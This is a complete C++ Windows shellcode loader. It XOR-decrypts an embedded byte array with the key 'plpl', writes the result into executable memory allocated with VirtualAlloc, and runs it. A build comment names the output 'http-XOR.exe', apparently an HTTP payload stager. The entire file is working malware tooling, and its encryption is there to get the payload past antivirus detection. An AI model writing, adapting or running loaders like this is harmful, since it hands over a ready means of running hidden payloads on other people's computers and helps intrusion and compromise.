#include <windows.h>
#include <iostream>


// g++ -o http-XOR.exe -O2 -s -fno-exceptions -fno-rtti -ffunction -sections -fdata -sections -std=c++11 inject-CryptXOR.cpp 

int main(int argc, char** argv) {

	//// Shellcode data ////
	char encryptedSc[] = "\x8c\x24\xf3\x88\x80\x84\xbc\x6c\x70\x6c\x31\x3d\x31\x3c\x22\x3d\x26\x24\x41\xbe\x15\x24\xfb\x3e\x10\x24\xfb\x3e\x68\x24\xfb\x3e\x50\x24\x7f\xdb\x3a\x26\x3d\x5d\xb9\x24\xfb\x1e\x20\x24\x41\xac\xdc\x50\x11\x10\x72\x40\x50\x2d\xb1\xa5\x7d\x2d\x71\xad\x92\x81\x22\x24\xfb\x3e\x50\xe7\x32\x50\x38\x6d\xa0\x2d\x21\x0a\xf1\x14\x68\x67\x72\x63\xf5\x1e\x70\x6c\x70\xe7\xf0\xe4\x70\x6c\x70\x24\xf5\xac\x04\x0b\x38\x6d\xa0\xe7\x38\x74\x34\xe7\x30\x4c\x20\x25\x71\xbc\x93\x3a\x3d\x5d\xb9\x24\x8f\xa5\x31\xe7\x44\xe4\x38\x6d\xa6\x24\x41\xac\xdc\x2d\xb1\xa5\x7d\x2d\x71\xad\x48\x8c\x05\x9d\x3c\x6f\x3c\x48\x78\x29\x49\xbd\x05\xb4\x28\x28\xfb\x2c\x54\x25\x71\xbc\x16\x2d\xfb\x60\x38\x28\xfb\x2c\x6c\x25\x71\xbc\x31\xe7\x74\xe4\x38\x6d\xa0\x2d\x28\x2d\x28\x32\x29\x36\x31\x34\x31\x35\x31\x36\x38\xef\x9c\x4c\x31\x3e\x8f\x8c\x28\x2d\x29\x36\x38\xe7\x62\x85\x3b\x93\x8f\x93\x2d\x25\xce\x1b\x03\x5e\x2f\x5f\x42\x6c\x70\x2d\x26\x25\xf9\x8a\x38\xed\x9c\xcc\x71\x6c\x70\x25\xf9\x89\x39\xd0\x72\x6c\x71\xd7\xb0\xc4\x82\xec\x31\x38\x39\xe5\x94\x20\xf9\x9d\x31\xd6\x3c\x1b\x56\x6b\x8f\xb9\x3c\xe5\x9a\x04\x71\x6d\x70\x6c\x29\x2d\xca\x45\xf0\x07\x70\x93\xa5\x06\x7a\x2d\x2e\x3c\x20\x21\x41\xa5\x3d\x5d\xb0\x24\x8f\xac\x38\xe5\xb2\x24\x8f\xac\x38\xe5\xb1\x2d\xca\x86\x7f\xb3\x90\x93\xa5\x24\xf9\xab\x1a\x7c\x31\x34\x3c\xe5\x92\x24\xf9\x95\x31\xd6\xe9\xc9\x04\x0d\x8f\xb9\xf5\xac\x04\x66\x39\x93\xbe\x19\x95\x84\xe3\x6c\x70\x6c\x38\xef\x9c\x7c\x38\xe5\x92\x21\x41\xa5\x1a\x68\x31\x34\x38\xe5\x89\x2d\xca\x6e\xa9\xa4\x2f\x93\xa5\xef\x88\x6c\x0e\x39\x38\xef\xb4\x4c\x2e\xe5\x86\x06\x30\x2d\x29\x04\x70\x7c\x70\x6c\x31\x34\x38\xe5\x82\x24\x41\xa5\x31\xd6\x28\xc8\x23\x89\x8f\xb9\x38\xe5\xb3\x25\xf9\xab\x3d\x5d\xb9\x25\xf9\x9c\x38\xe5\xaa\x24\xf9\x95\x31\xd6\x72\xb5\xb8\x33\x8f\xb9\xf3\x94\x70\x11\x58\x34\x31\x3b\x29\x04\x70\x2c\x70\x6c\x31\x34\x1a\x6c\x2a\x2d\xca\x67\x5f\x63\x40\x93\xa5\x3b\x29\x2d\xca\x19\x1e\x21\x11\x93\xa5\x25\x8f\xa2\x99\x50\x8f\x93\x8f\x24\x71\xaf\x38\x45\xb6\x24\xf5\x9a\x05\xd8\x31\x93\x97\x34\x1a\x6c\x29\xd7\x90\x71\x5a\x66\x31\xe5\xaa\x93\xa5";
	char key[] = "plplpl";
	char Sc[sizeof encryptedSc];	// Char array to host the deciphered shellcode

	//// XOR decrypt //// 
	int j = 0;
	for (int i = 0; i < sizeof encryptedSc; i++) {
		if (j == sizeof key - 1) j = 0;
		Sc[i] = encryptedSc[i] ^ key[j];
		j++;
	}

	////Allocate, Write, Execute ////
	void* heya = VirtualAlloc(0, sizeof Sc, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(heya, Sc, sizeof Sc);
	((void(*)())heya)();
}
